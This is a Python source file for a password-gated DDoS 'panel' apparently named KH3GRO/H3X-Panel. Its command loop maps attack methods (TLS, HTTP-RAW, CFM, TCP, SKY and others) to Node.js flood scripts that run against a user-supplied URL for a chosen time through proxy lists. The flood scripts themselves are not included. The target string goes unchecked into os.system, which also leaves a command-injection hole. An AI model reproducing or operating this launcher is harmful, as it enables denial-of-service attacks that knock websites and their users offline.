# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[31;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\032

 _  ___   _ _____  ____ ____   ___
| |/ / | | |___ / / ___|  _ \ / _ \
| ' /| |_| | |_ \| |  _| |_) | | | |
| . \|  _  |___) | |_| |  _ <| |_| |
|_|\_\_| |_|____/ \____|_| \_\\___/
    
    welcome to my panel kyrie
    
METHOD
├─( TCP )
├─( LAYER 7 ( X )
├─( LAYER 12 ( SKY )
├───( OMG )
├───(  TLS )
├───(HTTP-RAW )
├─── ( HTTP )
├─── ( 404 )
├───┐
│   ├─── FOR START ATTACK
              TYPE:  METHOD (URL) (TIME)

        
          \033[1;91m\033[1;41m\033[1;97m NOTE \033[;0m\033[1;91m\033[1;92m \033[1;97m⠀Dont spam attack! okay?

              
\033[31m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[32m

 _  ___   _ _____  ____ ____   ___
| |/ / | | |___ / / ___|  _ \ / _ \
| ' /| |_| | |_ \| |  _| |_) | | | |
| . \|  _  |___) | |_| |  _ <| |_| |
|_|\_\_| |_|____/ \____|_| \_\\___/⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ╔════════════════════════╗
                ║   \033[1;91m<═════\033[1;41m\033[1;97m TYPE HELP TO VIEW METHOD\033[;0m\033[1;91m═════>\033[1;92m \033[1;97m
              

""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] H3X-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;31m\033[1;41m\033[1;97mH 3 X @ P A N E L\033[;0m\033[1;91m\x1b[1;31m\033[31m:~# \x1b[1;37m\033[31m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  

		elif sinput == "HTTP-RAW" or sinput == "http-raw":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node BOM.js {target} {time} ')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "cfm" or sinput == "CFM":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node UAM.js {target} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
		
		elif sinput == "X" or sinput == "x":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTPS.js {url} 512 1000 proxy.txt 1000')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "OMG" or sinput == "omg":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node FAX.js {url} {time} 8 1')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
		
		elif sinput == "YOLO" or sinput == "yolo":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node YOLO.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS.js GET {url} proxy.txt {time} 64 10')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "NOX" or sinput == "nox":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node NOX.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "BOT" or sinput == "bot":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node BOT.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
				
		elif sinput == "404":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node 404.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "HTTP-MIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTP-MIX.js {url} {time} ')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		
#########LAYER-4######## 	

		elif sinput == "TCP":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L4 && node TCP.js {url} {time} 443 ')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
	#########LAYER-12######## 
		elif sinput == "SKY":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node SKY.js {url} {time} 512 1000 proxy.txt [] ')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
		#########LAYER-12######## 
		elif sinput == "TLS-PRO":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS-PRO.js {url} proxies.txt {time} [] ')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
										
def login():
	sys.stdout.write(f"\x1b]2;[\] XSOS-PANEL :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "KH3GRO"
	passwd = "KH3GRO"
	username = input("""\033[31m
\033[35m"
    
 _  ___   _ _____  ____ ____   ___
| |/ / | | |___ / / ___|  _ \ / _ \
| ' /| |_| | |_ \| |  _| |_) | | | |
| . \|  _  |___) | |_| |  _ <| |_| |
|_|\_\_| |_|____/ \____|_| \_\\___/
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                                               
          \033[1;91m<═════\033[1;41m\033[1;97m LOGIN KA \033[;0m\033[1;91m═════>\033[1;92m \033[1;97m⠀
						   
\033[1;41m\033[1;97mUsername :\033[;0m\033[1;91m """)
	password = getpass.getpass(prompt='\033[1;41m\033[1;97mPassword :\033[;0m\033[1;91m')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[31m \033[1;91m<═════\033[1;41m\033[1;97m WELCOME TO MY PANEL TANGINA MO \033[;0m\033[1;91m═════>\033[1;92m \033[1;97m")
		time.sleep(7)
		main()

login()
